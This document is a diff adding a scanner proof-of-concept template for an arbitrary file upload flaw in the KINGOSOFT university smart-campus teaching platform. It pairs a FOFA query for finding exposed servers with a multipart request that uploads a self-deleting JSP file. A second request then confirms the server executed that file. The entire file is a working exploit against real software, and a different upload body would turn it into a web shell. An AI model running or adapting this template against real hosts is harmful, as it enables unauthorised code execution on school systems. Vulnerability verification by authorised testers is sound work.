@@ -1,0 +1,33 @@
+id: poc-yaml-kingosoft-usctcsp-uploadfile-anyfile-upload
+info:
+  name: KINGOSOFT高校智慧校园教学综合服务平台 uploadfile 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 高校智慧校园教学综合服务平台
+  fofa: app="KINGOSOFT高校智慧校园教学综合服务平台"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /kyfw/frame/sbxm.sbxm.uploadfile.jsp
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
+  data: '------WebKitFormBoundaryKNt0t4vBe8cX9rZk
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"
+
+    Content-Type: text/plain
+
+
+    <% out.print("{{.t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--'
+  expression: status_code == 200 && contains(body,".jsp") && contains(gbk_decode(body),"上传处理页面")
+  output:
+  - regex_match(body,"source/uploadfile/(?P<file>.*?).jsp")
+- method: GET
+  path: /source/uploadfile/{{.file}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
